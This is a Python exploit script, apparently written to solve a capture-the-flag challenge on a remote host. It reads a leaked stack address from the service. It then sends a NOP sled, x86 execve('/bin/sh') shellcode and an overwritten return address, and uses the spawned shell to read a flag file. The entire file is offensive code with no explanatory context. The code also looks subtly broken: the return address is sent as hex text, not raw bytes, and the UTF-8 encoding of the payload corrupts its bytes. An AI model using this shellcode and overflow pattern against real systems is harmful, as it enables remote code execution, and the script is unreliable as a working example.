#!/usr/bin/env python3
import socket


hostname = 'thekidofarcrania.com'
port = 4902
addr = socket.gethostbyname(hostname)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((addr, port))
data = b''
text = b'text'
while not text in data:
    data += s.recv(1024)
data = data.decode()
addr_ind = data.index('0x')
addr = data[addr_ind + 2:addr_ind + 10]
print(addr)
new = ""
for i in range(len(addr) - 2, -1, -2):
    new += addr[i:i + 2]
print(new)

nop = '\x90' * 22
shellcode = "\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89"\
            "\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e"\
            "\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8"\
            "\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f"\
            "\x73\x68"
ret_addr = new
print(ret_addr)
print(nop)
payload = nop + shellcode + ret_addr
print(payload)
sent = s.send(payload.encode())
if not sent:
    print('Error')
addr_str = b'}'
data = b''
s.send("cat /flag2.txt".encode())
while not addr_str in data:
    data += s.recv(1024)
data.decode()
print(data)
